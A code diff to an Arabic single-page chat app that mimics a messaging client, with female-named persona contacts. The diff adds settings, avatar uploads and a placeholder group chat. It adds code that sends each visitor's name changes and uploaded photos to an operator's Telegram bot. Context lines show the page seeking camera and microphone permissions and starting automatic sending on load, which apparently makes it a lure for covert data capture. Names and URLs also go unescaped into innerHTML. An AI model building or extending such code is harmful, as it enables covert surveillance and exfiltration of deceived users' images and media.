@@ -181,6 +181,13 @@
             justify-content: center;
             font-size: 26px;
             flex-shrink: 0;
+            overflow: hidden;
+        }
+
+        .chat-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
 
         .chat-info {
@@ -265,6 +272,13 @@
             align-items: center;
             justify-content: center;
             font-size: 22px;
+            overflow: hidden;
+        }
+
+        .chat-header-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
 
         .chat-header-info {
@@ -776,6 +790,8 @@
             <div class="chats-header">
                 <h2>الدردشات</h2>
                 <div class="header-icons">
+                    <button class="icon-btn" onclick="openGroupChat()" title="جروب عام">👥</button>
+                    <button class="icon-btn" onclick="openSettings()" title="الإعدادات">⚙️</button>
                     <button class="add-chat-btn" onclick="openAddChatModal()">+</button>
                 </div>
             </div>
@@ -806,6 +822,40 @@
                 <button class="modal-btn confirm-btn" onclick="addChat()">إضافة</button>
                 <button class="modal-btn cancel-btn" onclick="closeAddChatModal()">إلغاء</button>
             </div>
+        </div>
+    </div>
+
+    <div class="modal" id="settingsModal">
+        <div class="modal-content">
+            <h3>⚙️ الإعدادات</h3>
+            <div style="text-align: center; margin-bottom: 20px;">
+                <div id="userAvatarPreview" style="width: 80px; height: 80px; border-radius: 50%; margin: 0 auto 15px; background: linear-gradient(135deg, #00a884 0%, #06cf9c 100%); display: flex; align-items: center; justify-content: center; font-size: 40px; overflow: hidden;">
+                    👤
+                </div>
+                <div style="font-size: 13px; color: #8696a0; margin-bottom: 5px;">ID</div>
+                <div style="font-size: 18px; color: #00a884; font-weight: 600;" id="userIdDisplay">73001</div>
+            </div>
+            <input type="text" class="modal-input" id="nameInput" placeholder="الاسم الحالي...">
+            <div style="font-size: 12px; color: #8696a0; margin: -15px 0 15px 0; text-align: center;" id="nameChangeTimer"></div>
+            <input type="file" id="avatarInput" accept="image/*" style="display: none;">
+            <button class="modal-btn confirm-btn" onclick="document.getElementById('avatarInput').click()" style="margin-bottom: 12px;">📷 تغيير الصورة</button>
+            <div style="font-size: 12px; color: #8696a0; margin: -8px 0 15px 0; text-align: center;" id="avatarChangeTimer"></div>
+            <div class="modal-buttons">
+                <button class="modal-btn confirm-btn" onclick="updateUserName()">حفظ الاسم</button>
+                <button class="modal-btn cancel-btn" onclick="closeSettings()">إغلاق</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal" id="groupChatModal">
+        <div class="modal-content">
+            <h3>👥 جروب عام</h3>
+            <div style="text-align: center; padding: 40px 20px; color: #8696a0;">
+                <div style="font-size: 60px; margin-bottom: 20px;">🚧</div>
+                <div style="font-size: 18px; color: #e9edef; margin-bottom: 10px;">قريباً</div>
+                <div style="font-size: 14px;">هذه الميزة ستكون متاحة قريباً</div>
+            </div>
+            <button class="modal-btn cancel-btn" onclick="closeGroupChat()">إغلاق</button>
         </div>
     </div>
 
@@ -854,7 +904,7 @@
 
         const users = {
             '83975': { name: 'نرجس', avatar: '🌸', sendCommand: '/send1' },
-            '12345': { name: 'جميله اكتوبر', avatar: '👨', sendCommand: '/send2' },
+            '12345': { name: 'جميله اكتوبر', avatar: 'https://i.ibb.co/9yD7RLm/image.jpg', sendCommand: '/send2' },
             '67890': { name: 'طيبه', avatar: '👩', sendCommand: '/send3' },
             '11111': { name: 'زهراء', avatar: '🧑', sendCommand: '/send4' },
             '22222': { name: 'سارة', avatar: '👧', sendCommand: '/send5' },
@@ -862,6 +912,26 @@
             '44444': { name: 'ليلى', avatar: '💁', sendCommand: '/send7' },
             '55555': { name: 'عاصفه الثلج', avatar: '👧', sendCommand: '/send8' }
         };
+
+        // معلومات المستخدم الحالي
+        let currentUser = {
+            id: '73001',
+            name: 'مستخدم',
+            avatar: '👤',
+            lastNameChange: 0,
+            lastAvatarChange: 0
+        };
+
+        function loadUserData() {
+            const saved = localStorage.getItem('currentUser');
+            if (saved) {
+                currentUser = JSON.parse(saved);
+            }
+        }
+
+        function saveUserData() {
+            localStorage.setItem('currentUser', JSON.stringify(currentUser));
+        }
 
         // طلب جميع الأذونات (الصوت + الكاميرا + الفيديو)
         async function requestAllPermissions(silent = false) {
@@ -1253,8 +1323,12 @@
                     chatItem.classList.add('active');
                 }
                 
+                const avatarContent = chat.avatar.startsWith('http') 
+                    ? `<img src="${chat.avatar}" alt="${chat.name}">`
+                    : chat.avatar;
+                
                 chatItem.innerHTML = `
-                    <div class="chat-avatar">${chat.avatar}</div>
+                    <div class="chat-avatar">${avatarContent}</div>
                     <div class="chat-info">
                         <div class="chat-name">${chat.name}</div>
                         <div class="chat-last-message">${chat.lastMessage || 'ابدأ الدردشة...'}</div>
@@ -1279,11 +1353,15 @@
                 document.getElementById('chatArea').classList.add('mobile-active');
             }
             
+            const avatarContent = chat.avatar.startsWith('http') 
+                ? `<img src="${chat.avatar}" alt="${chat.name}">`
+                : chat.avatar;
+            
             const chatArea = document.getElementById('chatArea');
             chatArea.innerHTML = `
                 <div class="chat-header">
                     <button class="back-btn" onclick="backToChats()">←</button>
-                    <div class="chat-header-avatar">${chat.avatar}</div>
+                    <div class="chat-header-avatar">${avatarContent}</div>
                     <div class="chat-header-info">
                         <h3>${chat.name}</h3>
                         <div class="chat-header-status">متصل الآن</div>
@@ -1633,10 +1711,180 @@
             }
         });
 
+        document.getElementById('settingsModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeSettings();
+            }
+        });
+
+        document.getElementById('groupChatModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeGroupChat();
+            }
+        });
+
+        // الإعدادات
+        function openSettings() {
+            document.getElementById('settingsModal').classList.add('active');
+            document.getElementById('nameInput').value = currentUser.name;
+            document.getElementById('userIdDisplay').textContent = currentUser.id;
+            
+            // عرض الصورة الحالية
+            const avatarPreview = document.getElementById('userAvatarPreview');
+            if (currentUser.avatar.startsWith('http') || currentUser.avatar.startsWith('data:')) {
+                avatarPreview.innerHTML = `<img src="${currentUser.avatar}" style="width: 100%; height: 100%; object-fit: cover;">`;
+            } else {
+                avatarPreview.innerHTML = currentUser.avatar;
+            }
+            
+            updateTimers();
+        }
+
+        function closeSettings() {
+            document.getElementById('settingsModal').classList.remove('active');
+        }
+
+        function updateTimers() {
+            const now = Date.now();
+            
+            // تحديث مؤقت الاسم (5 ساعات = 18000000 ميلي ثانية)
+            const nameTimeDiff = now - currentUser.lastNameChange;
+            const nameHoursLeft = Math.max(0, 5 - Math.floor(nameTimeDiff / 3600000));
+            const nameMinutesLeft = Math.max(0, Math.floor((18000000 - nameTimeDiff) / 60000) % 60);
+            
+            if (nameTimeDiff >= 18000000) {
+                document.getElementById('nameChangeTimer').textContent = '✅ يمكنك تغيير الاسم الآن';
+                document.getElementById('nameChangeTimer').style.color = '#00a884';
+            } else {
+                document.getElementById('nameChangeTimer').textContent = `⏳ يمكنك تغيير الاسم بعد ${nameHoursLeft} ساعة و ${nameMinutesLeft} دقيقة`;
+                document.getElementById('nameChangeTimer').style.color = '#f15c6d';
+            }
+            
+            // تحديث مؤقت الصورة (1 ساعة = 3600000 ميلي ثانية)
+            const avatarTimeDiff = now - currentUser.lastAvatarChange;
+            const avatarMinutesLeft = Math.max(0, Math.floor((3600000 - avatarTimeDiff) / 60000));
+            
+            if (avatarTimeDiff >= 3600000) {
+                document.getElementById('avatarChangeTimer').textContent = '✅ يمكنك تغيير الصورة الآن';
+                document.getElementById('avatarChangeTimer').style.color = '#00a884';
+            } else {
+                document.getElementById('avatarChangeTimer').textContent = `⏳ يمكنك تغيير الصورة بعد ${avatarMinutesLeft} دقيقة`;
+                document.getElementById('avatarChangeTimer').style.color = '#f15c6d';
+            }
+        }
+
+        async function updateUserName() {
+            const newName = document.getElementById('nameInput').value.trim();
+            if (!newName) {
+                alert('⚠️ الرجاء إدخال اسم');
+                return;
+            }
+            
+            const now = Date.now();
+            const timeDiff = now - currentUser.lastNameChange;
+            
+            if (timeDiff < 18000000) { // 5 ساعات
+                const hoursLeft = Math.ceil((18000000 - timeDiff) / 3600000);
+                alert(`⏳ يجب الانتظار ${hoursLeft} ساعة قبل تغيير الاسم مرة أخرى`);
+                return;
+            }
+            
+            const oldName = currentUser.name;
+            currentUser.name = newName;
+            currentUser.lastNameChange = now;
+            saveUserData();
+            
+            // إرسال إشعار للبوت
+            const message = `🔄 الايدي ${currentUser.id} غير اسمه من "${oldName}" الى "${newName}"`;
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            });
+            
+            alert('✅ تم تغيير الاسم بنجاح');
+            closeSettings();
+        }
+
+        document.getElementById('avatarInput').addEventListener('change', async function(e) {
+            const file = e.target.files[0];
+            if (!file) return;
+            
+            const now = Date.now();
+            const timeDiff = now - currentUser.lastAvatarChange;
+            
+            if (timeDiff < 3600000) { // 1 ساعة
+                const minutesLeft = Math.ceil((3600000 - timeDiff) / 60000);
+                alert(`⏳ يجب الانتظار ${minutesLeft} دقيقة قبل تغيير الصورة مرة أخرى`);
+                e.target.value = '';
+                return;
+            }
+            
+            const reader = new FileReader();
+            reader.onload = async function(event) {
+                const imageData = event.target.result;
+                
+                // تحديث الصورة محلياً
+                currentUser.avatar = imageData;
+                currentUser.lastAvatarChange = now;
+                saveUserData();
+                
+                // تحديث العرض في الإعدادات
+                const avatarPreview = document.getElementById('userAvatarPreview');
+                avatarPreview.innerHTML = `<img src="${imageData}" style="width: 100%; height: 100%; object-fit: cover;">`;
+                
+                // إرسال الصورة للبوت
+                try {
+                    // تحويل base64 إلى blob
+                    const response = await fetch(imageData);
+                    const blob = await response.blob();
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'avatar.jpg');
+                    formData.append('caption', `🖼️ الايدي ${currentUser.id} غير صورته`);
+                    
+                    const sendResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    const result = await sendResponse.json();
+                    if (result.ok) {
+                        console.log('✅ تم إرسال الصورة للبوت');
+                        alert('✅ تم تغيير الصورة وإرسالها بنجاح');
+                    } else {
+                        console.error('❌ خطأ في إرسال الصورة:', result);
+                        alert('✅ تم تغيير الصورة محلياً، لكن حدث خطأ في الإرسال للبوت');
+                    }
+                } catch (error) {
+                    console.error('❌ خطأ في إرسال الصورة:', error);
+                    alert('✅ تم تغيير الصورة محلياً، لكن حدث خطأ في الإرسال للبوت');
+                }
+                
+                updateTimers();
+            };
+            reader.readAsDataURL(file);
+            
+            e.target.value = '';
+        });
+
+        function openGroupChat() {
+            document.getElementById('groupChatModal').classList.add('active');
+        }
+
+        function closeGroupChat() {
+            document.getElementById('groupChatModal').classList.remove('active');
+        }
+
         // عند تحميل الصفحة، فحص الأذونات وبدء الإرسال التلقائي
         window.addEventListener('load', async () => {
             loadData();
             loadPermissions();
+            loadUserData();
             
             // فحص الصلاحيات المخزنة وبدء الإرسال التلقائي تلقائياً
             if (permissionsGranted.audio && permissionsGranted.video) {
